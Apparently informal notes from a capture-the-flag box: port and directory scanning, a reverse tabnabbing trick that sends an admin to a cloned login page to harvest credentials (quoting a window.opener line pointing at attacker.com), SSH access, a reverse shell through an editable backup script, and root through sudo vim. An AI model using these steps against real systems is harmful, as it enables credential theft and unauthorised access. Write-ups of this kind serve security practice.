Started with a nmap scan
```
22 OpenSSH 8.2p1 Ubuntu
80 Apache 2.4.41
```
Started a gobuster scan also did a scan in the admin folder for php and js files also
```
/admin
/admin/login.php
/index.php
/register.php
/logout.php
/config.php shows nothing
/reset-password.php
/welcome.php this shows after we login
```
Started a nikto scan found some login pages 

If we go to the site there is a login page as the main site and if you go to `/admin` it says 403 forbidden but if we go to   `/admin/login.php` it gives us a admin login page 
On the website we can make a account and ask us to give  a link and the admin will approve of the blog account I made `test:test123` has to be 6 letters or numbers for the password

Testing the main login page for sqli and the forum post after login and password reset did not find anything

Looking at the source code of the site looks like its vuln to `tab napping` In a situation where an **attacker** can **control** the `href` argument of an `<a` tag with the attribute `target="_blank" rel="opener"` that is going to be clicked by a victim so we made a script that we take the `admin login` page and copy it and add some php code the will output the login to are host machine and then we have to make a `index.php` file and add this code to it so we got 
	`window.opener.location = https://attacker.com/victim.html`
and then we need to setup a php or python web listener and make sure you got `index.php` and `login.php` 
if you have a new browser it might not  actually be able to do this part sometimes and use have to urldecode the password 
	`daniel:<REDACTED>` 
And with these creds we can ssh into the machine 
Now we have to get to the user `adrian` some how found some db creds 
	`adrian:<REDACTED>`   
There was not much in the db but 2 different hashes 
There was a interesting file found in `adrian` folder that we can edit that makes backups so I made a shell script to a bash reverse shell and then edit the python file to call the shell script and now we got a reverse shell as `adrian` and we run `sudo -l ` and we can run vim as root and now we got root access 